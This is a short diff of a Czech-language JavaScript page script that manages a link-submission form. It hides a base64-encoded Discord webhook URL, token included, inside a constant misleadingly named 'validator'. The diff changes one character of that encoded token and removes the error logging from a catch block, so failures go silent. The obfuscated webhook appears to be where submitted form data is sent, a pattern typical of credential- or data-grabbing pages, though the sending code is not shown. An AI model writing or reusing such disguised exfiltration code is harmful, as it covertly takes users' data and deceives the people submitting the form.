@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const modeLabelFull = document.getElementById('modeLabelFull');
     const fullModeFields = document.querySelectorAll('.fullModeField');
     const linkForm = document.getElementById('linkForm');
-    const validator = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxODY4MTAxNzAyMzg1Njc2Mi9ZMVpva0VvRlhUVGQybExDdkRrVlBhSnN0b1NrQ1NzNDczdDZwWDFWcENBV1QyNjRhNnY5TVFrYTE5Qk9ZQ3JxQTdTbA==';
+    const validator = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxODY4MTAxNzAyMzg1Njc2Mi9ZMVpva0VvRlhUVEQybExDdkRrVlBhSnN0b1NrQ1NzNDczdDZwWDFWcENBV1QyNjRhNnY5TVFrYTE5Qk9ZQ3JxQTdTbA==';
 
     function toggleMode() {
         const isSimplifiedMode = modeLabelFull.innerText === 'Zjednodušený';
@@ -67,7 +67,6 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
         } catch (error) {
-            console.error('Error:', error);
         }
     }
 
